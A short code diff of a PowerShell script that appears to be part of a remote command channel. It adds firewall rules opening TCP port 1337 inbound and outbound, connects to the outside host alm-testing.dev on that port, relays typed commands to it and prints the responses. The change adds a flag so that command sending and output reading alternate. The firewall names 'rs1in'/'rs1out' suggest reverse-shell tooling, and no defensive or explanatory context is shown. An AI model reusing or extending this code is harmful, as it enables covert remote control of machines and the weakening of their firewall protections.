@@ -5,6 +5,7 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
 if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
 } 
+$cmd_wait = $true;
 
 try {
 	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
@@ -31,14 +32,16 @@ try {
 					$in_buff = $in_reader.ReadLine();
 					Write-Output $in_buff;
 				}
+				$cmd_wait = $false;
 			}				
 		} 
 		
-		if ($exit -ne 1) {
+		if ($exit -ne 1 -and $cmd_wait -eq $false) {
 			$cmd = Read-host "cmd";
 			if ($cmd -ne "") {
 				$writer.WriteLine($cmd);
 				$writer.Flush();
+				$cmd_wait = $true;
 			}
 		}
 	}
